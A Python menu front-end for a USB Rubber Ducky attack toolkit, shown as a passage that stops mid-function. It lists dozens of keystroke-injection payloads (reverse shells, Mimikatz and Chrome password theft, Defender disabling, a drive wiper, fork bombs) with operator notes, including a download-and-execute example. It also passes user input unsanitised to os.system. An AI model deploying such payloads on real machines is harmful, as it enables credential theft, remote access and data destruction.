#!/usr/bin/python3
# coding=utf-8

import os
import apt
import sys
import time
import locale
#import filecmp
import argparse
import platform
#import subprocess   ## TODO // Remove if not necessary
from dialog import Dialog

locale.setlocale(locale.LC_ALL, '')

#print("\x1b[8;50;140t")

d = Dialog(dialog="dialog", autowidgetsize=True)

# ++ VARIABLES FOR FOLDER PATHS ++ #
help_folder =     './menus/help/ducky/'
payload_folder =  './payloads/ducky/'
exports_folder =  './payloads/exports/'
firmware_folder = './tools/ducky/USB-Rubber-Ducky/ducky-flasher/Firmware/'
# -- VARIABLES FOR FOLDER PATHS -- #

# ++ DICTIONARY VALUES FOR DEFAULT SCRIPT NAMES ++ #
script_names = {'01' : '01_Hello_World', '02' : '02_WiFi_Password_Grabber', '03' : '03_Basic_Terminal_Commands_Ubuntu', '04' : '04_Information_Gathering_Ubuntu', '05.1' : '05.1_Hide_CMD_Window', '05.2' : '05.2_Hide_CMD_Window', '05.3' : '05.3_Hide_CMD_Window', '06' : '06_Netcat_FTP_Download_And_Reverse_Shell', '07.1' : '07.1_Wallpaper_Prank', '07.2' : '07.2_Wallpaper_Prank', '07.3' : '07.3_Wallpaper_Prank', '08' : '08_You_Got_Quacked', '09' : '09_Reverse_Shell',
                '10' : '10_Reverse_Shell_With_Persistence', '11.1' : '11.1_Fork_Bomb', '11.2' : '11.2_Fork_Bomb', '12' : '12_Utilman_Exploit', '13' : '13_WiFi_Backdoor', '14' : '14_Non_Malicious_Auto_Defacer', '15' : '15_Lock_Your_Computer_Message', '16' : '16_Ducky_Downloader', '17' : '17_Ducky_Phisher', '18' : '18_FTP_Download_Upload', '19' : '19_Restart_Prank', '20.1' : '20.1_Silly_Mouse_Windows_Is_For_Kids', '20.2' : '20.2_Silly_Mouse_Windows_Is_For_Kids',
                '21.1' : '21.1_Windows_Screen_Rotation_Hack', '21.2' : '21.2_Windows_Screen_Rotation_Hack', '22.1' : '22.1_Powershell_Wget_Execute', '22.2' : '22.2_Powershell_Wget_Execute', '22.3' : '22.3_Powershell_Wget_Execute', '23.1' : '23.1_Mimikatz_Payload', '23.2' : '23.2_Mimikatz_Payload', '24' : '24_MobileTabs', '25' : '25_Create_Wireless_Network_Association_Auto_Connect_Pineapple', '26.1' : '26.1_Retrieve_SAM_And_SYSTEM_From_A_Live_File_System',
                '26.2' : '26.2_Retrieve_SAM_And_SYSTEM_From_A_Live_File_System', '27' : '27_Ugly_Rolled_Prank', '28' : '28_XMAS', '29' : '29_Pineapple_Association_Very_Fast', '30' : '30_WiFun', '31' : '31_MissDirection', '32' : '32_Remotely_Possible', '33' : '33_Batch_Wiper_Drive_Eraser', '34' : '34_Generic_Batch', '35' : '35_Paint_Hack', '36' : '36_Local_DNS_Poisoning', '37' : '37_Deny_Net_Access', '38.1' : '38.1_Run_EXE_From_SD', '38.2' : '38.2_Run_EXE_From_SD',
                '38.3' : '38.3_Run_EXE_From_SD', '39' : '39_Run_JAVA_From_SD', '40' : '40_OSX_Sudo_Passwords_Grabber', '41' : '41_OSX_Root_Backdoor', '42' : '42_OSX_User_Backdoor', '43' : '43_OSX_Local_DNS_Poisoning', '44' : '44_OSX_YouTube_Blaster', '45' : '45_OSX_Photo_Booth_Prank', '46' : '46_OSX_Internet_Protocol_Slurp', '47' : '47_OSX_ASCII_Prank', '48' : '48_OSX_iMessage_Capture', '49' : '49_OSX_Grab_Minecraft_Account_Password_And_Upload_To_FTP',
                '50' : '50_OSX_Wget_And_Execute', '51' : '51_OSX_Passwordless_SSH_Access', '52' : '52_OSX_Bella_RAT_Installation', '53' : '53_OSX_Sudo_For_All_Users_Without_Password', '54' : '54_Mr_Grays_Rubber_Hacks', '55' : '55_Copy_File_To_Desktop', '56' : '56_YouTube_Roll', '57' : '57_Disable_AVG_2012', '58' : '58_Disable_AVG_2013', '59' : '59_EICAR_AV_Test', '60' : '60_Download_Mimikatz_Grab_Passwords_And_Email', '61' : '61_Hotdog_Wallpaper', '62' : '62_Android_5.x_Lockscreen',
                '63' : '63_Chrome_Password_Stealer', '64' : '64_Website_Lock', '65' : '65_Windows_10_Download_And_Execute_File_With_Powershell', '66' : '66_Windows_10_Disable_Windows_Defender', '67' : '67_Windows_10_Disable_Windows_Defender_Through_Powershell', '68' : '68_Windows_7_Logoff_Prank', '69' : '69_Windows_10_Logoff_Prank', '70' : '70_Netcat_Reverse_Shell', '71' : '71_Fake_Update_Screen', '72' : '72_Rickroll'}
# -- DICTIONARY VALUES FOR DEFAULT SCRIPT NAMES -- #

# ++ DETERMINE WHAT LINUX OS IS BEING USED (CURRENTLY TESTING WITH KALI) ++ #
linux_distro = platform.linux_distribution()

if 'Kali' in linux_distro:

    isKali = True

else:

    isKali = False
# -- DETERMINE WHAT LINUX OS IS BEING USED (CURRENTLY TESTING WITH KALI) -- #

def payload_notes():
    if note_desc != '':
        d.msgbox(note_desc, height=0, width=0, title=main_tag + " Payload Notes")

# ++ FUNCTION FOR DISPLAYING A SCROLLABLE TEXT BOX WITH THE HELP FILE ++ #
def ducky_help():

    ## TODO // Update the README File with current features and functionalities

    if current_menu == 'main_menu':

        d.textbox(help_folder + 'payloads_menu', height=None, width=None, title="Payloads Menu Help")

        ducky_main_menu()

    elif current_menu == 'tag_proc_menu':

        d.textbox(help_folder + 'payload_functions', height=None, width=None, title="Payload Functions Help")

        tag_proc()

    elif current_menu == 'flash_firmware_menu':

        d.textbox(help_folder + 'flash_firmware', height=None, width=None, title="Firmware Flashing Help")

        flash_firmware_menu()
# -- FUNCTION FOR DISPLAYING A SCROLLABLE TEXT BOX WITH THE README FILE -- #

# ++ FUNCTION FOR EDITING THE SELECTED PAYLOAD, STORING THE RESULT & RETURN TO TAG_PROC MENU ++ #
def edit_payload():

    global ptext

    with open(payload_folder + script_names[script_number]) as orig_file:
        pfile = orig_file.read()

    if os.path.exists(exports_folder + script_names[script_number]):
        payload_notes()
        pcode, ptext = d.editbox(exports_folder + script_names[script_number], height=0, width=0, title="Editing Exported Payload Script File " + exports_folder + script_names[script_number])

    else:
        payload_notes()
        pcode, ptext = d.editbox(payload_folder + script_names[script_number], height=0, width=0, title="Editing Original Payload Script File " + payload_folder + script_names[script_number])


    if pcode == d.OK:

        with open(exports_folder + script_names[script_number], 'w') as export_file:
            export_file.write(ptext)

        d.msgbox("Payload has been successfully written to\n" + exports_folder + script_names[script_number])

        tag_proc()

    if pcode == d.CANCEL:
        d.msgbox(ptext)
        #if pfile != ptext:

        #    cancel_code = d.yesno("Are you sure you wish to cancel without saving?", yes_label='Yes', no_label='No')

        #    if cancel_code == d.OK:
        #        tag_proc()

        #    else:
        #        d.editbox(ptext, height=0, width=0, title=payload_folder + script_names[script_number])

# -- FUNCTION FOR EDITING THE SELECTED PAYLOAD, STORING THE RESULT & RETURN TO TAG_PROC MENU -- #

# ++ FUNCTION FOR ENCODING THE CURRENTLY SELECTED PAYLOAD IN ITS ORIGINAL OR MODIFIED STATE ++ #
def encode_payload():
    fcode, fstring = d.inputbox("Please enter the path to your\nUSB Rubber Ducky SD Card\n\nThis is usually somewhere under /media/SDCARD/", height=0, width=0, init='/media/')

    if fcode == d.OK:

        if os.path.exists(exports_folder + script_names[script_number]):

            encode_result = os.system('java -jar ../tools/ducky/USB-Rubber-Ducky/duckencoder.jar -i ' + exports_folder + script_names[script_number] + ' -o ' + fstring + 'inject.bin')

            if encode_result == 0:
                d.msgbox("\nThe payload has been exported successfully!", height=8, width=35, title="Encode Payload Result")
                tag_proc()

            else:
                d.msgbox("\nAn error occured while encoding the payload!", title="Encode Payload Result")
                tag_proc()

        elif os.path.exists(payload_folder + script_names[script_number]):

            encode_result = os.system('java -jar ../tools/ducky/USB-Rubber-Ducky/duckencoder.jar -i ' + payload_folder + script_names[script_number] + ' -o ' + fstring + 'inject.bin')

            if encode_result == 0:
                d.msgbox("\nThe payload has been exported successfully!", height=8, width=35, title="Encode Payload Result")
                tag_proc()

            else:
                d.msgbox("\nAn error occured while encoding the payload!", title="Encode Payload Result")
                tag_proc()

    if fcode == d.CANCEL:
        tag_proc()
# -- FUNCTION FOR ENCODING THE CURRENTLY SELECTED PAYLOAD IN ITS ORIGINAL OR MODIFIED STATE -- #

def delete_payload():

    if os.path.exists(exports_folder + script_names[script_number]):

        yncode = d.yesno("\nAn exported payload file has been found at\n" + exports_folder + script_names[script_number] + ".\n\nAre you sure you want to delete this file?", title="Delete Exported File?", yes_label="YES", no_label="NO")

        if yncode == d.OK:

            os.remove(exports_folder + script_names[script_number])
            tag_proc()

        else:
            tag_proc()

    else:
        d.msgbox("\nAn exported payload could not be found at\n" + exports_folder + script_names[script_number], width=45, height=8, title='Delete Payload')
        tag_proc()

# ++ FUNCTION FOR FLASHING DIFFERENT FIRMWARES TO THE USB RUBBER DUCKY (CURRENTLY SUPPORTS 6 FW'S) ++ #
def flash_firmware_updater(firmware):

    ## TODO // First version of the updater as a prototype. Intending to rewrite in the future

    odf_count = 0

    d.gauge_start(title="Flashing The Ducky, Please Wait...")

    d.gauge_update(33, "Erasing Firmware...", update_text= True);

    odf_count += os.system('sudo dfu-programmer at32uc3b1256 erase');

    time.sleep(1);

    d.gauge_update(67, "Flashing Firmware...", update_text= True);

    odf_count += os.system('sudo dfu-programmer at32uc3b1256 flash --suppress-bootloader-mem --quiet ' + firmware_folder + firmware);

    time.sleep(1);

    d.gauge_update(100, "Resetting Ducky...", update_text= True);

    odf_count += os.system('sudo dfu-programmer at32uc3b1256 reset');

    time.sleep(1)

    d.gauge_stop()

    if odf_count == 0:

        d.msgbox("\nOriginal Duck Firmware has been flashed successfully",
                 title="Firmware Status")

        tag_proc()

    else:

        d.msgbox("\nAn error occured while flashing the ducky.\n\nPlease ensure the following and try again:\n\n1. 'dfu-programmer' is installed. You can attempt to install it with\n\t\t\t'apt-get install dfu-programmer'.\n\n2. You have placed the ducky in DFU Programming Mode by holding the\n\t\t\tbutton while plugging in the ducky and then try flashing again.",
                 title="Firmware Status")

        flash_firmware_menu()
# -- FUNCTION FOR FLASHING DIFFERENT FIRMWARES TO THE USB RUBBER DUCKY (CURRENTLY SUPPORTS 6 FW'S) -- #

# ++ FUNCTION TO PROVIDE A MENU TO SELECT A DUCKY FIRMWARE TO FLASH (CURRENTLY SUPPORTS 6 FW'S) ++ #
def flash_firmware_menu():

    global current_menu

    current_menu = 'flash_firmware_menu'

    firmwares = ['duck_v2.hex', 'USB_v2.hex', 'm_duck_v2.hex', 'c_duck_v2.hex', 'c_duck_v2_S001.hex', 'c_duck_v2_S002.hex']

    flash_desc = "\nThis menu will allow you to flash a specific firmware to the USB Rubber Ducky\n\nIn order to do so, you must place your ducky in DFU Programming Mode\nby holding down the button while plugging it in\n\nSee the help section for more information on firmwares"

    fp_code, fp_tag = d.radiolist(flash_desc, height=None, width=None, list_height=None, title="Select Ducky Firmware To Flash",
                choices=[("Original Duck Firmware", "The original ducky firmware", False),
                         ("FAT Duck", "Turns the ducky into a USB Mass Storage Device", False),
                         ("Detour Duck", "A firmware that supports multiple payloads", False),
                         ("Twin Duck", "HID injection and Mass Storage support", False),
                         ("Twin Duck Special Request 1", "Executes payload on LED trigger (Cap Locks, Num Locks, etc)", False),
                         ("Twin Duck Special Request 2", "Executes payload on pressing the GPIO pin", False)],
                         help_button=True)

    if fp_code == d.OK:

        if fp_tag == "Original Duck Firmware":

            flash_firmware_updater(firmwares[0])

        if fp_tag == "FAT Duck":

            flash_firmware_updater(firmwares[1])

        if fp_tag == "Detour Duck":

            flash_firmware_updater(firmwares[2])

        if fp_tag == "Twin Duck":

            flash_firmware_updater(firmwares[3])

        if fp_tag == "Twin Duck Special Request 1":

            flash_firmware_updater(firmwares[4])

        if fp_tag == "Twin Duck Special Request 2":

            flash_firmware_updater(firmwares[5])

    if fp_code == d.HELP:
        ducky_help()

    if fp_code == d.CANCEL:
        tag_proc()
# -- FUNCTION TO PROVIDE A MENU TO SELECT A DUCKY FIRMWARE TO FLASH (CURRENTLY SUPPORTS 6 FW'S) -- #

# ++ FUNCTION TO PROVIDE A MENU TO PROCESS EACH TAG ASSIGNED PAYLOAD (CURRENTLY SUPPORTS 4 FUNCTIONS) ++ #
def tag_proc():

    global tp_tag, current_menu

    current_menu = 'tag_proc_menu'

    tp_code, tp_tag = d.menu("\n" + desc_tag,
                                choices=[("Edit Payload", "Edits the currently selected payload"),
                                ("Encode Payload", "Encodes the original or edited payload to a folder or SD card"),
                                ("Delete Payload", "Deletes the exported payload from /payloads/exports/ if it exists"),
                                ("Flash Firmware", "Flashes a specific firmware to the USB Rubber Ducky")],
                                title=main_tag,
                                help_button=True)

    if tp_code == d.OK:

        if tp_tag == "Edit Payload":
            edit_payload()

        if tp_tag == "Encode Payload":
            encode_payload()

        if tp_tag == "Delete Payload":
            delete_payload()

        if tp_tag == "Flash Firmware":
            flash_firmware_menu()

    if tp_code == d.HELP:
        ducky_help()

    if tp_code == d.CANCEL:
        ducky_main_menu()
# -- FUNCTION TO PROVIDE A MENU TO PROCESS EACH TAG ASSIGNED PAYLOAD (CURRENTLY SUPPORTS 4 FUNCTIONS) -- #

# ++ FUNCTION FOR THE DUCKY PAYLOADS MAIN MENU ++ #
def ducky_main_menu():

    global main_tag, desc_tag, note_desc, script_number, current_menu

    current_menu = 'main_menu'
    ## TODO // Possible Idea For Next Version - Redesign this to modify each payload file as a config file with [PAYLOAD NAME] [SHORT DESCRIPTION] [HELP INFO] Etc and read Key info from config file.
    ## TODO // Add a section for users to write their custom payloads in the editor and save them to a customs dir under /payloads/ducky/customs /payloads/bunny/customs etc. Also performing the same dynamic processing as listed above.
    ## TODO // Custom Menu Choices - Edit Payload Name | Edit Short Description | Edit Payload Script | Edit Payload Notes

    main_code, main_tag = d.menu("\nSelect a payload below for more options\n\nThe official HAK5 USB Rubber Ducky Documentation Site can be found at: https://www.hak5.org/gear/usb-rubber-ducky/docs\n\nFor more ducky ",
                       choices=[("Hello World", "A payload for testing the USB Rubber ducky’s functionality"),
                                ("WiFi Password Grabber", "Grabs, Logs and Emails WiFi Passwords"),
                                ("Basic Terminal Commands Ubuntu", "Example of how to execute commands in Ubuntu through Xterm"),
                                ("Information Gathering Ubuntu", "Collects info from a running Ubuntu OS and saves it to a file"),
                                ("Hide CMD Window 1", "Example of how to hide the Windows Command Prompt - Version 1"),
                                ("Hide CMD Window 2", "Example of how to hide the Windows Command Prompt - Version 2"),
                                ("Hide CMD Window 3", "Example of how to hide the Windows Command Prompt - Version 3"),
                                ("Netcat FTP Download & Reverse Shell", "Log into FTP Server and start a Netcat reverse shell"),
                                ("Wallpaper Prank 1", "The ol' set your disabled desktop as your wallpaper prank - Version 1"),
                                ("Wallpaper Prank 2", "The ol' set your disabled desktop as your wallpaper prank - Version 2"),
                                ("Wallpaper Prank 3", "The ol' set your disabled desktop as your wallpaper prank - Version 3"),
                                ("You Got Quacked!", "Changes the users desktop background to “YOU GOT QUACKED!” with a Hak5 logo"),
                                ("Reverse Shell", "Uses some ASCII to Binary tricks to open a reverse shell"),
                                ("Reverse Shell + Persistence", "Persistent netcat reverse shell that runs in the background every 5 minutes"),
                                ("Fork Bomb 1", "Creates a Fork Bomb batch file in startup for Windows 7"),
                                ("Fork Bomb 2", "Creates a Fork Bomb batch file in startup for Windows 10"),
                                ("Utilman Exploit", "Uses the Utilman.exe Exploit to create a new local administrator account"),
                                ("WiFi Backdoor", "Open a CMD bypassing UAC then create a wireless access point"),
                                ("Non Malicious Auto Defacer", "Automatically defaces index page of an apache web server"),
                                ("Lock Your Computer Message", "Opens notepad and types a message concerning locking the computer"),
                                ("Ducky Downloader", "Opens the command prompt & creates a VBscript to download a file from any URL"),
                                ("Ducky Phisher", "Modifies hosts file to redirect web sites to a site of your choosing"),
                                ("FTP Download/Upload", "Downloads WinSCP and uploads the user profile, recursive, to a FTP server"),
                                ("Restart Prank", "Adds a batch file to startup to restart the users PC"),
                                ("Silly Mouse, Windows Is For Kids 1", "Changes cursor to loading sign and kills windows explorer - Version 1"),
                                ("Silly Mouse, Windows Is For Kids 2", "Changes cursor to loading sign and kills windows explorer - Version 2"),
                                ("Windows Screen Rotation Hack 1", "Rotate the screen 180 degrees on Windows 7"),
                                ("Windows Screen Rotation Hack 2", "Rotate the screen 180 degrees on Windows 10"),
                                ("Powershell Wget Execute 1", "Execute Powershell script from run box - Version 1"),
                                ("Powershell Wget Execute 2", "Execute Powershell script from run box - Version 2"),
                                ("Powershell Wget Execute 3", "Execute Powershell script from run box - Version 3"),
                                ("Mimikatz Payload 1", "Downloads mimikatz from web server and grabs passwords - Version 1"),
                                ("Mimikatz Payload 2", "Downloads mimikatz from web server and grabs passwords - Version 2"),
                                ("MobileTabs", "Sends command line arguments to IE to open tabs of your choosing"),
                                ("Create Wireless Network Association", "Creates a network association for the wifi pineapple"),
                                ("Retrieve SAM & SYSTEM From a Live File System 1", "Grabs the SAM and SYSTEM files for hash retrieval later on - Version 1"),
                                ("Retrieve SAM & SYSTEM From a Live File System 2", "Grabs the SAM and SYSTEM files for hash retrieval later on - Version 2"),
                                ("Ugly Rolled Prank", "User profile start-up prank"),
                                ("XMAS", "Happy Holidays Christmas Payload"),
                                ("Pineapple Association", "Downloads an XML File and adds it to the local wireless profiles"),
                                ("WiFun", "Sends local wireless settings via FTP"),
                                ("MissDirection", "Edits the hosts file to allow you to redirect web pages where you would like the user to go"),
                                ("Remotely Possible", "Disables firewall, creates local administrator account and enables remote access"),
                                ("Batch Wiper Drive Eraser", "Erases attached drives on your computer"),
                                ("Generic Batch", "Creates a script that types in a generic batch file and executes siletntly"),
                                ("Paint Hack", "Breaks into command prompt using Microsoft Paint"),
                                ("Local DNS Poisoning", "Changes local HOSTS file to perform a site redirect attack"),
                                ("Deny Net Access", "Prank payload to deny network access"),
                                ("Run EXE From SD 1", "Run an executable file off of the SD card after it mounts - Version 1"),
                                ("Run EXE From SD 2", "Run an executable file off of the SD card after it mounts - Version 2"),
                                ("Run EXE From SD 3", "Run an executable file off of the SD card after it mounts - Version 3"),
                                ("Run Java From SD", "Run a java application off the ducky drive after it mounts"),
                                ("Linux and OSX sudo password grabber", "Inject a sudo backdoor by installing a wrapper inside .config/sudo/"),
                                ("OSX Root Backdoor", "A simple script for rooting OSX from single user mode"),
                                ("OSX User Backdoor", "A simple script for creating a persistent backdoor on OSX"),
                                ("OSX Local DNS Poisoning", "A script to create a local DNS entry in the host file of a mac"),
                                ("OSX Youtube Blaster", "Open terminal, turn the volume up all the way & open a youtube video of your choice"),
                                ("OSX Photo Booth Prank", "Prank that uses photo booth to take a photo of a user and open a terminal to tell them they are ugly"),
                                ("OSX Internet Protocol Slurp", "This payload quickly copies down information gathered from ifconfig"),
                                ("OSX ASCII Prank", "Displays an ASCII art image as a prank"),
                                ("OSX iMessage Capture", "This script captures iMessages and puts it into a folder named the victims username"),
                                ("OSX Grab Minecraft Account Password & Upload to FTP", "This payload dumps the minecraft password and uploads it via FTP"),
                                ("OSX Wget and Execute", "Simple script that downloads any file and runs it"),
                                ("OSX Passwordless SSH Access", "This script adds a ssh public key to the authorized_keys file on a target's mac"),
                                ("OSX Bella RAT Installation", "Bella Ducky Script for USB Rubber Ducky from Hak5"),
                                ("OSX Sudo For All Users Without Password", "Enables sudo for ALL users without requiring a password"),
                                ("Mr Grays Rubber Hacks", "Modified version of Mr Gray's password recovery script"),
                                ("Copy File To Desktop", "Wait for ducky mass storage to mount, then copy file to desktop"),
                                ("YouTube Roll", "Simple YouTube Rick Roll Payload"),
                                ("Disable AVG 2012", "Disables AVG 2012 until next restart & assumes that UAC has not been used recently"),
                                ("Disable AVG 2013", "Temporarily disables AVG 2013 for 15 minutes assumes that UAC has not been used recently"),
                                ("EICAR AV Test", "Places test string in a file on desktop to try and trigger AV"),
                                ("Download Mimikatz Grab Passwords & Email", "Downloads mimikatz, grabs passwords & emails them via gmail"),
                                ("Hotdog Wallpaper", "Changes desktop wallpaper to an image of hot dogs"),
                                ("Android 5.x Lockscreen", "Payload to bypass lock-screen on 5.x build (LMY48I) and below"),
                                ("Chrome Password Stealer", "Steals Chrome passwords in the blink of an eye"),
                                ("Website Lock", "Opens a web site with mouse and keyboad locked"),
                                ("Windows 10 : Download & execute file with Powershell", "Uses powershell to download and execute a file from a webserver"),
                                ("Windows 10 : Disable Windows Defender", "Disables Windows Defender, then clears the action center prompt"),
                                ("Windows 10 : Disable Windows Defender Through Powershell", "Disable Windows Defender With Powershell"),
                                ("Windows 7 Logoff Prank", "Logs out of a Windows 7 machine"),
                                ("Windows 10 Logoff Prank", "Logs out of a Windows 10 machine"),
                                ("Netcat Reverse Shell", "Starts a Netcat Reverse Shell"),
                                ("Fake Update Screen", "Brings up the Windows 10 page of fakeupdate.net and make it full screen"),
                                ("Rickroll", "Never gonna give you up!"),],
                       title="HAK5 USB Rubber Ducky Payload Collection",
                       backtitle="TSK | USB Rubber Ducky Menu",
                       no_shadow=True,
                       help_button=True,)

    if main_code == d.OK:

        if main_tag == "Hello World":
            script_number = '01'
            desc_tag = "A payload for testing the USB Rubber ducky’s functionality"
            note_desc = ''
            tag_proc()

        if main_tag == "WiFi Password Grabber":
            script_number = '02'
            desc_tag = "Grabs, Logs and Emails WiFi Passwords"
            note_desc = '\nChange the following things:\n\nACCOUNT:  Your gmail account\n\nPASSWORD: Your gmail password\n\nRECEIVER: The email you want to send the contents of Log.txt to'
            tag_proc()

        if main_tag == "Basic Terminal Commands Ubuntu":
            script_number = '03'
            desc_tag = "Example of how to execute commands in Ubuntu through Xterm"
            note_desc = '\nThe following script is an example of how to execute commands in Ubuntu Linux through xterm.\n\nThe script first initiates the run application window through ubuntu and later on it triggers the command xterm.\n\nAfter the execution of the terminal it issues the commands "pwd", "id" and "cat /etc/passwd".'
            tag_proc()

        if main_tag == "Information Gathering Ubuntu":
            script_number = '04'
            desc_tag = "Collects info from a running Ubuntu OS and saves it to a file"
            note_desc = '\nThe following script is an information gatherer script which collects info from a running Ubuntu OS and saves it to a file named "info_gathering.txt".\n\nThe info that the script retrieves is the logged in username, the distribution and kernel version of the running system, the applicability of the shellsock bug, the mounted filesystems, information which is related to the Network adapters, availability of development tools (python, g++), contents of the hosts file and the listening TCP/UDP connections.\n\nApart from that it attempts to find readable folders inside the /etc folder and also prints the SUID and GUID files.'
            tag_proc()

        if main_tag == "Hide CMD Window 1":
            script_number = '05.1'
            desc_tag = "Example of how to hide the Windows Command Prompt - Version 1"
            note_desc = '\nThe following is an example of how to hide the command window below the bottom of the screen while typing in commands.\n\nThe window movement part of the script can also be used on any other window.\n\nCMD.exe is also run with some command line flags for changing the appearance of the window to make it harder to view, and also a flag that turns on delayed expansion in the command prompt which allows for variable names to be called more than once in a line with no adverse effects.\n\nEx…​ SET Something = Something + Something_Else.\n\nWindows can also be hidden on other sides of the screen ex…​ replace DOWNARROW with RIGHTARROW, LEFTARROW, UPARROW.'
            tag_proc()

        if main_tag == "Hide CMD Window 2":
            script_number = '05.2'
            desc_tag = "Example of how to hide the Windows Command Prompt - Version 2"
            note_desc = '\nThe following is an attempt to create a hide CMD window script that uses a key combo to run as administrator when UAC is turned on.\n\nWindows can also be hidden on other sides of the screen ex…​ replace DOWNARROW with RIGHTARROW, LEFTARROW, UPARROW.'
            tag_proc()

        if main_tag == "Hide CMD Window 3":
            script_number = '05.3'
            desc_tag = "Example of how to hide the Windows Command Prompt - Version 3"
            note_desc = '\nOther windows can be hidden also, as demonstrated in this powershell hide, get, and execute.\n\nWindows can also be hidden on other sides of the screen ex…​ replace DOWNARROW with RIGHTARROW, LEFTARROW, UPARROW.'
            tag_proc()

        if main_tag == "Netcat FTP Download & Reverse Shell":
            script_number = '06'
            desc_tag = "Log into FTP Server and start a Netcat reverse shell"
            note_desc = '\nThis script will:\n\n- Create an FTP script that logs you in to the FTP server and download netcat\n\n- Delete the FTP script file\n\n- Run netcat in daemon mode\n\n- Run cmd.exe one more time to conceal the command we used in the run history\n\nFill in the required information where you see the brackets.'
            tag_proc()

        if main_tag == "Wallpaper Prank 1":
            script_number = '07.1'
            desc_tag = "The ol' set your disabled desktop as your wallpaper prank - Version 1"
            note_desc = '\nAuthor: Darren Kitchen\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: Minimizes all windows to desktop, takes screenshot, disables desktop icons, saves screenshot in %userprofile% and sets as wallpaper.'
            tag_proc()

        if main_tag == "Wallpaper Prank 2":
            script_number = '07.2'
            desc_tag = "The ol' set your disabled desktop as your wallpaper prank - Version 2"
            note_desc = '\nAuthor: FlyinGrub\n\nTarget: Windows 7\n\nDescription: same things but better :P, (works on french windows 7, some shortcut differs …)'
            tag_proc()

        if main_tag == "Wallpaper Prank 3":
            script_number = '07.3'
            desc_tag = "The ol' set your disabled desktop as your wallpaper prank - Version 3"
            note_desc = '\nAuthor: C4PT4IN B4RCODE\n\nTarget: Windows 10\n\nDescription: same thing with the addition of hiding the desktop icons (works on Portuguese windows 10)'
            tag_proc()

        if main_tag == "You Got Quacked!":
            script_number = '08'
            desc_tag = "Changes the users desktop background to “YOU GOT QUACKED!” with a Hak5 logo"
            note_desc = '\nAuthor: Caleb Hutchinson\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: Changes the users desktop background to a Rubber Duck saying\n“YOU GOT QUACKED!” with a Hak5 logo :D'
            tag_proc()

        if main_tag == "Reverse Shell":
            script_number = '09'
            desc_tag = "Uses some ASCII to Binary tricks to open a reverse shell"
            note_desc = '\nAuthor: Darren Kitchen with mad props to IllWill dabermania.blogspot.co.il/2011/04/copying-executable-from-teensy-using.html\n\n27/12/2017: Mod by r00tpgp, removed admin privilege cmd, added auto overwrite on copy con and removed absolute path\n\nDuckencoder: 1.0\n\nTarget: Windows 7(32&64b), Windows 2008 Server\n\nDescription: Opens administrative CMD prompt, creates decoder.vbs containing code to convert base64 encoded ascii to binary, creates text file including base64 ascii of binary file to create reverse shell.\nConverts second file to exe with first file. Executes with host and port parameters.\n\nProps to go illwill for this payload. See dabermania.blogspot.co.il/2011/04/copying-executable-from-teensy-using.html'
            tag_proc()

        if main_tag == "Reverse Shell + Persistence":
            script_number = '10'
            desc_tag = "Persistent netcat reverse shell that runs in the background every 5 minutes"
            note_desc = '\nPersistent netcat reverse shell that runs in the background every 5 minutes\n\nReplace [IP] with your listening IP\n\nReplace [PORT] with a port of your choice'
            tag_proc()

        if main_tag == "Fork Bomb 1":
            script_number = '11.1'
            desc_tag = "Creates a Fork Bomb batch file in startup for Windows 7"
            note_desc = '\nAuthor: Jay Kruer with mad props to Darren Kitchen for helping me out with con copy, UAC bypass & file saving issues at DerbyCon :D\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: Opens a command prompt as an administrator with run, uses con copy to create fork bomb batch(if you don’t know what this is then see: http://en.wikipedia.org/wiki/Fork_bomb).\nThen saves the .bat file under the start up program folder and runs it the first time.'
            tag_proc()

        if main_tag == "Fork Bomb 2":
            script_number = '11.2'
            desc_tag = "Creates a Fork Bomb batch file in startup for Windows 10"
            note_desc = '\nAuthor: Trump, FULL CREDIT & RESPECT TO THE PREVIOUS AUTHORS\n\nDuckencoder: 1.2\n\nTarget: Windows 10\n\nDescription: Same as before except revamped for Windows 10 Users. PLEASE ADD DELAYS DEPENDING ON COMPUTER SPEED!!'
            tag_proc()

        if main_tag == "Utilman Exploit":
            script_number = '12'
            desc_tag = "Uses the Utilman.exe Exploit to create a new local administrator account"
            note_desc = '\nAuthor: Xcellerator (props to Jay Kruer\'s Fork Bomb script for the UAC bypass technique!)\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: Uses the Utilman.exe Exploit to create a new local administrator account “Local000” with the password “hak5”.'
            tag_proc()

        if main_tag == "WiFi Backdoor":
            script_number = '13'
            desc_tag = "Open a CMD bypassing UAC then create a wireless access point"
            note_desc = '\nAuthor: Darren Kitchen\n\nDuckencoder: 1.0\n\nTarget: Windows 7\n\nDescription: Open a CMD bypassing UAC then create a wireless access point with the SSID noobcake and WPA key 12345678, then lower firewall.'
            tag_proc()

        if main_tag == "Non Malicious Auto Defacer":
            script_number = '14'
            desc_tag = "Automatically defaces index page of an apache web server"
            note_desc = '\nAuthor: Xcellerator\n\nDuckencoder: 1.2\n\nTarget: Ubuntu based systems running the Apache Web Server\n\nDescription: Saves old index file as index.bak, then writes a new one detailing the extensiveness of the hack that has been performed against them. Mad props to anyone who actually pulls this off. Educational Purposes Only.\n\nNOTE: Originally this script had a DEFAULT_DELAY value of 200. Since this value did not fit into a Java byte\n(Java bytes are signed) it had no effect on the final script. It has been removed.'
            tag_proc()

        if main_tag == "Lock Your Computer Message":
            script_number = '15'
            desc_tag = "Opens notepad and types a message concerning locking the computer"
            note_desc = '\nAuthor: SurfKahuna\n\nDuckencoder: 1.1\n\nTarget: Windows XP, Vista, and 7\n\nDescription: I use this script to leave a message for my agents who do not lock their computers when they leave my class for break, lunch, etc. Opens a new Notepad doc, inserts a message concerning the need to lock the computer, and maximizes the window. I can then lock the computer or leave it unlocked for the whole class to see the agent\'s mistake. Not an advanced script, but fun nonetheless.'
            tag_proc()

        if main_tag == "Ducky Downloader":
            script_number = '16'
            desc_tag = "Opens the command prompt & creates a VBscript to download a file from any URL"
            note_desc = '\nAuthor: Haysoos\n\nDuckencoder: 1.2\n\nTarget: Windows 7\n\nDescription: Opens the command prompt (not as administrator) creates a VBscript to download a file from any URL. Downloads a file and executes it. Useful for downloading small .exe files from a web server and executing them\n\nExample:\n...\nENTER\nSTRING cscript download.vbs http://example.com/fun_windows_executable.exe\nENTER\nSTRING fun_windows_executable.exe\nENTER\nSTRING exit\nENTER'
            tag_proc()

        if main_tag == "Ducky Phisher":
            script_number = '17'
            desc_tag = "Modifies hosts file to redirect web sites to a site of your choosing"
